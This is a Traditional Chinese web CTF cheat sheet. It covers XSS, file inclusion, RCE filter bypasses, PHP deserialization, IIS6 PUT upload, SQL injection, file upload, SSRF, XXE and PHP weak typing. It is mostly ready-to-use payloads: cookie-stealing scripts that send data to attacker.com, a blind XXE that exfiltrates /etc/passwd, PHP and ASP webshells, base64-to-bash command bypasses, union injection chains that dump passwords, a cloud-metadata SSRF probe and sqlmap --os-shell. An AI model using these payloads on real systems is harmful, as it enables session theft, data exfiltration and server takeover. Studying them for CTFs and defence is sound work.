# Web CTF 重要解題技巧整理（繁體中文擴充版）

本文根據原始課程整理內容（XSS、檔案包含、變數覆蓋、RCE、PHP 反序列化、IIS6.0 PUT 上傳）翻譯為繁體中文，並額外補充 **SQL 注入**、**檔案上傳漏洞**、**SSRF**、**XXE**、**PHP 弱型別比較**等常見 CTF Web 題型與更詳細的攻擊範例，方便複習與做題時查閱。

---

## 一、XSS（跨站腳本攻擊）

### 1. 常用測試 Payload

| Payload | 效果 |
|---|---|
| `<script>alert("hack")</script>` | 彈出字串 hack |
| `<script>alert(/hack/)</script>` | 用斜線代替引號，繞過引號過濾，同樣彈出 hack |
| `<script>alert(1)</script>` | 數字可以不加引號，常用於探測是否存在 XSS |
| `<script>alert(document.cookie)</script>` | 彈出目前頁面 Cookie，用於驗證能否竊取會話 |
| `<script src=http://xxx.com/xss.js></script>` | 引用外部腳本，常用於載入更複雜的攻擊程式碼（如 BeEF hook） |

### 2. 標籤/事件過濾繞過常用招式

| 手法 | 範例 |
|---|---|
| 大小寫混淆 | `<ScRiPt>alert(1)</sCriPt>` |
| 事件屬性代替 `<script>` | `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<body onload=alert(1)>` |
| 無需空格的寫法 | `<svg/onload=alert(1)>`、`<img/src=x/onerror=alert(1)>` |
| 偽協議觸發 | `<a href="javascript:alert(1)">click</a>` |
| 編碼繞過（HTML 實體） | `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>` |
| 利用 `<iframe>`/`<object>` | `<iframe src="javascript:alert(1)">` |
| 過濾 `alert` 關鍵字時 | 用 `top['al'+'ert'](1)`、`window[atob('YWxlcnQ=')](1)`、`confirm(1)`、`prompt(1)` 代替 |
| 過濾括號時 | `<script>onerror=alert;throw 1</script>` |

### 3. 竊取 Cookie 常用 Payload（存儲型 / DOM 型常用）

```html
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### 4. XSS 三種類型對比

| 類型 | 特性 | 觸發位置 | 典型場景 |
|---|---|---|---|
| **反射型 XSS** | 非持久性、參數型，程式碼存在於請求參數（變數）中 | 需要受害者點擊帶惡意參數的連結 | 搜尋框回顯 |
| **儲存型 XSS** | 持久性，程式碼寫入資料庫/檔案等可永久保存的媒介 | 只要訪問被污染的頁面就會觸發，無需特製連結 | 留言板、評論區 |
| **DOM 型 XSS** | payload 透過修改瀏覽器端 DOM 樹而執行，不一定經過伺服器 | 前端 JS 解析 URL/DOM 中的惡意資料 | 前端路由、hash 參數處理 |

**攻擊流程（通用五步模型）**：
1. 駭客發送帶有 XSS 惡意腳本的連結（或存入資料庫）
2. 使用者點擊連結／瀏覽存在惡意腳本的頁面，訪問目標伺服器
3. 網站將 XSS 程式碼隨正常頁面回傳給使用者瀏覽器
4. 使用者瀏覽器解析頁面中的惡意程式碼，向駭客的惡意伺服器發送請求（攜帶 Cookie 等敏感資訊）
5. 駭客從自己架設的惡意伺服器中取得使用者提交的資訊

**解題技巧**：判斷題目類型時，先看輸入點是否被存入資料庫（儲存型）、是否僅反映在 URL 參數（反射型），還是完全由前端 JS 處理（DOM 型），從而決定 payload 投放方式。

---

## 二、檔案包含漏洞（File Inclusion）

### 1. 基本概念
- PHP 透過 `include()`、`require()`、`include_once()`、`require_once()` 四個函式實現檔案包含。
- **關鍵特性**：被包含檔案不需要以 `.php` 結尾，只要檔案內容含有 PHP 程式碼，包含後就會被當作 PHP 執行——這是檔案包含漏洞的根本原因。

### 2. 本地檔案包含（LFI）
- 常見測試 payload：`?file=phpinfo`（探測包含點及回顯）
- 環境操作（Kali + Apache 常用指令）：
  - 啟動：`service apache2 start`
  - 重啟：`service apache2 restart`

**解題技巧**：LFI 常配合「檔案上傳 + 包含圖片馬」或「包含日誌 / session 檔案」來 getshell；也可讀取 `/etc/passwd`、`php://filter` 原始碼洩漏等。

### 3. 常見 LFI 目標檔案（讀敏感檔）

```
/etc/passwd
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log   （日誌污染 getshell）
C:\Windows\System32\drivers\etc\hosts
```

### 4. 偽協議（Pseudo Protocol）利用

| 協議 | 觸發條件 | Payload 範例 |
|---|---|---|
| `php://filter` | 任何情況皆可用，用於讀原始碼 | `?file=php://filter/convert.base64-encode/resource=index.php` |
| `php://input` | `allow_url_include = On`，需配合 **POST** 傳入程式碼 | `?file=php://input`，POST body：`<?php system("whoami");?>` |
| `data://` | `allow_url_include = On` 且 `PHP < 5.3.0`（部分環境仍可用） | `?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==`（Base64 解碼後為 `<?php system("whoami");?>`） |
| `zip://` / `phar://` | 配合上傳的壓縮檔觸發，繞過後綴限制 | `?file=zip://upload.jpg%23shell.php` |

**解題技巧**：
- 先確認 `allow_url_include` 是否開啟（決定能否用 `php://input`、`data://`、`http://` 等遠端協議）。
- `php://filter` 常用於**讀原始碼**，`php://input`/`data://` 常用於**直接執行程式碼（RCE）**。
- 用線上工具或 `echo -n '程式碼' | base64` 產生 `data://` 所需的 Base64。

---

## 三、變數覆蓋漏洞

### 三種常見成因

| 類型 | 說明 |
|---|---|
| **`$$` 導致的變數覆蓋** | 可變變數語法 `$$a` 會以 `$a` 的值作為新變數名，攻擊者若能控制變數名/值即可覆蓋已存在的同名變數 |
| **`extract()` 函式導致的變數覆蓋** | 將陣列的鍵名作為變數名、鍵值作為變數值導入目前符號表；若陣列內容可控（如直接 `extract($_GET)`），可覆蓋任意已定義變數 |
| **`parse_str()` 函式導致的變數覆蓋** | 用於解析查詢字串到變數；若未指定 `array` 參數接收結果，解析出的變數會直接覆蓋同名的已有變數 |

**解題技巧**：
- 審計程式碼時重點找 `extract($_GET/$_POST/$_REQUEST)`、`parse_str($_SERVER['QUERY_STRING'])`（無第二參數）、`$$key = $value` 這類寫法。
- 常見利用思路：覆蓋鑑權變數（如 `$is_admin`、`$auth`）、覆蓋檔案包含路徑變數，從而繞過權限判斷或觸發二次漏洞（LFI/RCE）。

---

## 四、RCE（遠端命令 / 程式碼執行）

### 1. 定義
Web 應用呼叫可執行系統命令的函式時，若未嚴格過濾使用者輸入，攻擊者提交的惡意命令會被伺服器執行。

### 2. PHP 中可執行命令的函式
`system()`、`exec()`、`shell_exec()`、`passthru()`、`pcntl_exec()`、`popen()`、`proc_open()`，另外反引號 `` ` `` 等價於 `shell_exec()`。程式碼執行類還有 `eval()`、`assert()`、`create_function()`、`call_user_func()`。

### 3. 命令連接符

**Windows 與 Linux 通用：**
| 連接符 | 效果 |
|---|---|
| `cmd1｜cmd2` | 只執行 cmd2（管道，非嚴格意義連接符） |
| `cmd1｜｜cmd2` | cmd1 執行失敗後才執行 cmd2 |
| `cmd1& cmd2` | 先執行 cmd1，不論成敗都會執行 cmd2 |
| `cmd1&& cmd2` | cmd1 成功後才執行 cmd2，否則不執行 |

**僅 Linux 支援：**
| 連接符 | 效果 |
|---|---|
| `cmd1;cmd2` | 按順序依次執行，無論成敗 |

### 4. RCE 過濾繞過技巧

**（1）空格繞過**
- Shell 中可用：`${IFS}`、`$IFS$9`、`<`、`<>`、`{,}`
- URL 中可用：`<`、`%20`（空格編碼）、`%09`（Tab 編碼）、`$IFS$9`

**（2）敏感字元 / 關鍵字繞過**
1. **變數拼接繞過**：例如 `a=c;b=a;c=t;$a$b$c eval.php` → 拼接出 `cat` 指令
2. **Base64 編碼繞過**：`echo 'Y2F0IGV2YWwucGhw'|base64 -d | bash`
3. **反引號命令執行繞過**：`` `echo 'Y2F0IGV2YWwucGhw'|base64 -d` ``
4. **萬用字元繞過**：`c?t` 代替 `cat`、`/???/??t` 代替 `/bin/cat`
5. **拼接反斜線斷詞**：`c\at f\lag.txt`

**解題技巧**：當 `cat`、`flag`、空格、`ls` 等關鍵字被 WAF/黑名單過濾時，優先嘗試：
- 用 `${IFS}` 代替空格
- 把敏感命令 Base64 編碼後再解碼執行，繞過關鍵字檢測
- 用變數拼接把命令拆開寫，規避靜態關鍵字比對
- 用萬用字元 `*`、`?` 代替部分字母

---

## 五、PHP 反序列化 — 魔術方法（Magic Methods）

| 魔術方法 | 觸發條件 |
|---|---|
| `__wakeup()` | 使用 `unserialize()` 時觸發 |
| `__sleep()` | 使用 `serialize()` 時觸發 |
| `__destruct()` | 物件被銷毀時觸發（腳本結束、顯式 unset 等） |
| `__construct()` | 物件被建立時觸發 |
| `__call()` | 在物件上下文中呼叫**不可存取**的方法時觸發 |
| `__get()` | 讀取**未定義或不可見**的成員變數時觸發 |
| `__set()` | 寫入**不存在或不可見**的成員變數時觸發 |
| `__isset()` | 對不可存取的屬性呼叫 `isset()`/`empty()` 時觸發 |
| `__unset()` | 對不可存取的屬性呼叫 `unset()` 時觸發 |
| `__toString()` | 將物件當作字串使用時觸發 |
| `__invoke()` | 腳本嘗試將物件當作函式呼叫時觸發 |

**解題技巧**：
- 反序列化題目通常從 `__destruct()` 或 `__wakeup()` 作為**利用鏈入口**，逐步串聯 `__toString()`、`__call()`、`__get()` 等構造 POP 鏈，最終觸達 `system()`/檔案讀寫等危險函式（gadget chain）。
- 注意 CVE-2016-7124：當序列化字串中屬性個數大於實際屬性數時，可**繞過 `__wakeup()`**（PHP < 5.6.25 / 7.0.10）。
- 構造 payload 時善用 PHP 內建函式 `serialize()` 本地生成後再提交。

**PHP 反序列化字串長度陷阱**：手動修改序列化字串中的屬性值時，字串前的數字代表**位元組長度**，若改動內容長度需同步修改該數字，否則會反序列化失敗。

---

## 六、IIS 6.0 PUT 上傳漏洞

### 上傳原理
- WebDAV 是基於 HTTP/1.1 協議擴展的通訊協議，使 HTTP 支援 `PUT`、`MOVE`、`COPY`、`DELETE` 等方法。
- 若 IIS 6.0 開啟 WebDAV 且配置不當，攻擊者可直接用 `PUT` 方法上傳檔案。

### 利用步驟示例
1. 先用 `PUT` 上傳一個**非 asp 後綴**（如 `.txt`）的檔案，寫入惡意程式碼：
   ```
   PUT /1.txt HTTP/1.1
   Host: 127.0.0.1
   Content-Length: 30

   <% eval request ("a")%>
   ```
2. 再用 `MOVE`（或 `COPY`）方法將 `1.txt` 改名/複製為 `.asp` 等可解析後綴，從而繞過對可執行後綴的直接上傳限制，使 WebShell 生效。

**解題技巧**：
- 遇到目標為老舊 IIS6.0（尤其帶 WebDAV）時，優先測試 `OPTIONS` 方法查看伺服器支援的 HTTP 方法列表，確認是否開放 `PUT`。
- 上傳 `.txt`/`.jpg` 等安全後綴繞過上傳檢測，再用 `MOVE` 改名為可執行後綴，是這類漏洞的經典繞過思路。

---

## 七、SQL 注入（新增擴充）

### 1. 基本判斷方式

| 測試方法 | payload | 說明 |
|---|---|---|
| 單引號探測 | `id=1'` | 若報錯或頁面異常，可能存在注入 |
| 邏輯真假對比 | `id=1 and 1=1` / `id=1 and 1=2` | 兩者回應不同即存在注入（布林盲注基礎） |
| 排序法找欄位數 | `id=1 order by 3--+` | 逐漸加大數字直到報錯，確定欄位數 |
| 聯合查詢探測 | `id=-1 union select 1,2,3--+` | 配合欄位數，找出回顯位置 |

### 2. 聯合查詢注入（Union-based）完整流程

```sql
-- 1. 判斷欄位數
?id=1 order by 4--+        -- 報錯代表欄位數 < 4，改成 order by 3 測試

-- 2. 確認回顯位（把 id 設為不存在的值讓原查詢無結果）
?id=-1 union select 1,2,3--+

-- 3. 查資料庫名、版本、目前使用者
?id=-1 union select 1,database(),version()--+
?id=-1 union select 1,user(),@@datadir--+

-- 4. 查所有資料庫
?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+

-- 5. 查目前資料庫的資料表
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

-- 6. 查資料表欄位名
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

-- 7. 取出資料
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+
```
> `0x3a` 為十六進位表示的 `:`，用於拼接欄位方便一次顯示多筆資訊。

### 3. 報錯注入（Error-based，適用於有回顯但只顯示錯誤訊息時）

```sql
-- updatexml
?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

-- extractvalue
?id=1 and extractvalue(1,concat(0x7e,(select database())))--+

-- floor + rand 報錯（group by 重複鍵）
?id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
```

### 4. 布林盲注（Boolean-based Blind）

```sql
-- 判斷資料庫名長度
?id=1 and length(database())=8--+

-- 逐字元猜資料庫名（ASCII 二分法）
?id=1 and ascii(substr(database(),1,1))>100--+

-- 常搭配 substr / mid / left 截取
?id=1 and substr(database(),1,1)='s'--+
```

### 5. 時間盲注（Time-based Blind，無回顯時使用）

```sql
?id=1 and if(length(database())=8,sleep(3),0)--+
?id=1 and if(ascii(substr(database(),1,1))=115,sleep(3),0)--+
```

### 6. 堆疊查詢注入（Stacked Queries，需資料庫/驅動支援多語句）

```sql
?id=1;insert into users(username,password) values('hacker','123456')--+
```

### 7. 常見過濾繞過技巧

| 過濾內容 | 繞過方式 |
|---|---|
| 空格被過濾 | 用 `/**/`、`%0a`（換行）、`()`（如 `union(select...)`）代替空格 |
| `union`、`select` 被過濾 | 大小寫混淆 `UnIoN SeLeCt`；雙寫繞過 `unionunion selectselect`（若只刪一次） |
| `=` 被過濾 | 用 `like`、`regexp`、`in` 代替 |
| 引號被過濾 | 用十六進位 `0x...` 或 `unhex()` 代替字串 |
| `and`/`or` 被過濾 | 用 `&&`、`||`，或改用注釋符 `#`、`--+`、`/**/` 混淆 |
| 逗號被過濾 | 用 `substr(str from 1 for 1)` 代替 `substr(str,1,1)` |
| 註解符被過濾 | Access 沒有註解符，需閉合括號；MySQL 可用 `#`、`--+`、`/*!...*/` |

### 8. SQLMap 常用指令速查

```bash
sqlmap -u "http://target/?id=1" --dbs                     # 列出資料庫
sqlmap -u "http://target/?id=1" -D dbname --tables         # 列出資料表
sqlmap -u "http://target/?id=1" -D dbname -T users --columns
sqlmap -u "http://target/?id=1" -D dbname -T users -C username,password --dump
sqlmap -u "http://target/?id=1" --cookie="PHPSESSID=xxx" --level=3 --risk=2
sqlmap -u "http://target/?id=1" --os-shell               # 嘗試直接 getshell
```

**解題技巧**：CTF 中拿到疑似注入點時，先手動用單引號 / `and 1=1` 快速判斷是否有注入及類型（報錯 / 盲注 / 聯合），再決定手工注入還是丟 SQLMap 跑；若題目有 WAF，先手工繞過再交給 SQLMap（設定 `--tamper` 腳本，如 `space2comment`）。

---

## 八、檔案上傳漏洞（新增）

### 1. 常見繞過檢測方式

| 檢測方式 | 繞過方法 |
|---|---|
| 前端 JS 檢查後綴 | 直接用 Burp Suite 攔截請求，繞過前端檢查 |
| 後端黑名單後綴 | 用 `.php3`、`.php5`、`.phtml`、`.pht`、`.phar` 等特殊後綴繞過（需伺服器支援解析） |
| 大小寫繞過 | `.pHp`、`.PHP` |
| 特殊後綴繞過（Windows） | 檔名後加空格或點：`shell.php ` 、`shell.php.` |
| MIME 類型檢查 | 修改 `Content-Type` 為 `image/jpeg` |
| 檔案內容檢查（檔頭） | 在惡意程式碼前加上圖片檔頭，如 `GIF89a` 製作「圖片馬」，再配合檔案包含執行 |
| `.htaccess` 解析漏洞 | 上傳 `.htaccess` 內容 `AddType application/x-httpd-php .jpg`，之後上傳的 `.jpg` 會被當 PHP 解析 |
| 00 截斷（舊版 PHP） | `shell.php%00.jpg`，僅在 PHP < 5.3.4 且 magic_quotes_gpc 關閉時有效 |
| 條件競爭上傳 | 檔案先寫入再檢測合法性的情況下，於刪除前快速訪問已上傳的惡意檔案 |

### 2. 圖片馬範例

```
GIF89a
<?php eval($_POST['a']);?>
```
儲存為 `shell.jpg`，再配合檔案包含（`?file=shell.jpg`）使其被當 PHP 解析執行。

---

## 九、SSRF（伺服器端請求偽造，新增）

### 1. 常見觸發點
- 分享/轉發連結、圖片抓取、Webhook、URL 預覽、匯入遠端檔案等功能。

### 2. 常用 Payload

```
http://127.0.0.1/admin
http://localhost:6379/            # 探測內網 Redis
file:///etc/passwd                # 讀本機檔案（若協議未限制）
http://169.254.169.254/latest/meta-data/   # 雲端 metadata 竊取憑證（AWS 等）
dict://127.0.0.1:6379/info        # dict 協議探測服務 banner
gopher://127.0.0.1:6379/_...      # gopher 協議打內網服務（如未授權 Redis 寫 shell）
```

### 3. 繞過 IP 過濾技巧

| 過濾方式 | 繞過方法 |
|---|---|
| 過濾 `127.0.0.1` | 用 `0.0.0.0`、`localhost`、`0177.0.0.1`（八進位）、`2130706433`（十進位）、`[::1]`（IPv6） |
| 過濾內網網段 | 用短網址跳轉、DNS 重綁定（先解析為外網 IP 通過檢測，再改回內網 IP） |
| 過濾協議 | 大小寫混淆 `HTTP://`、多加斜線 `http:///127.0.0.1` |

---

## 十、XXE（XML 外部實體注入，新增）

### 1. 基本 Payload（讀取檔案）

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 2. 無回顯時的 Blind XXE（外帶資料）

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root>&send;</root>
```
`evil.dtd` 內容：
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/collect?data=%file;'>">
%eval;
```

**解題技巧**：遇到接受 XML 輸入的介面（檔案上傳解析、SOAP、Office 檔案等），優先測試 XXE；若目標關閉了外部實體回顯，改用 Blind XXE 透過 DNS/HTTP 外帶。

---

## 十一、PHP 弱型別比較特性（新增，CTF 常考）

| 情境 | 說明 / 繞過方式 |
|---|---|
| `==` 弱比較 | `"0e123456" == "0e654321"` 為 `true`（皆被當作科學記號 0），常用於繞過雜湊值比對 |
| `md5()` 弱比較繞過 | 找出 md5 值以 `0e` 開頭的字串（俗稱 "magic hash"），用 `==` 比較會被當作相等 |
| 陣列繞過 `md5()`/`sha1()` | 傳入陣列 `param[]=1` 使 `md5($param)` 回傳 `NULL`，若同時比較兩個都傳陣列，`NULL==NULL` 為 `true` |
| `in_array()` 弱型別 | 未加第三參數 `true` 時會發生類型轉換，`in_array("abc", [0,1,2])` 為 `true` |
| `strcmp()` 陣列繞過 | 傳入陣列會使 `strcmp()` 回傳 `NULL` 或報錯但不中斷，某些寫法可繞過密碼比對 |
| `switch` 弱比較 | `switch($a){case 0: ...}` 時若 `$a` 為字串且無法轉數字，可能仍匹配 `case 0` |

---

## 速查小結（解題時的思維順序）

1. **資訊收集**：識別中介軟體/框架版本（決定是否有 IIS6 PUT、反序列化 CVE 等已知漏洞），看回應標頭、報錯訊息、robots.txt、原始碼註解。
2. **輸入點分析**：判斷參數最終流向——是否被 `include`、`extract`/`parse_str`、`system` 系函式、`unserialize`、SQL 查詢、XML 解析、頁面回顯等接收。
3. **按類型選擇攻擊手法**：
   - 回顯到 HTML → 優先測試 XSS（先 `alert(1)` 探測，再判斷反射/儲存/DOM 型）
   - 參與資料庫查詢 → 測試 SQL 注入（單引號探測 → 判斷聯合/報錯/盲注 → 逐步取資料）
   - 參與檔案包含 → 測試 LFI，嘗試偽協議 `php://filter`（讀原始碼）/`php://input`、`data://`（RCE）
   - 檔案上傳功能 → 測試黑名單/白名單繞過、圖片馬、`.htaccess`、條件競爭
   - 涉及外部連結請求 → 測試 SSRF，探測內網服務與雲端 metadata
   - 接受 XML 輸入 → 測試 XXE（回顯 / Blind）
   - 參與變數賦值函式（`extract`/`parse_str`/`$$`）→ 測試變數覆蓋繞過鑑權
   - 拼接進系統命令 → 測試命令連接符注入，遇過濾則用空格繞過 + 編碼/拼接繞過關鍵字
   - 涉及 `unserialize()` → 構造魔術方法 POP 鏈
   - 涉及弱型別比較（`==`、`in_array`、`strcmp`）→ 嘗試型別混淆繞過
   - 老舊 IIS + WebDAV → 測試 PUT/MOVE 上傳
4. **繞過過濾**：編碼（URL/Base64/十六進位）、大小寫、拼接、協議變形、空格替代符、型別混淆等是各類漏洞通用的繞過思路。
5. **工具輔助**：Burp Suite（攔截改包、Intruder 爆破）、SQLMap（自動化 SQL 注入）、御劍/dirsearch（目錄掃描）、蟻劍/菜刀（webshell 管理）。
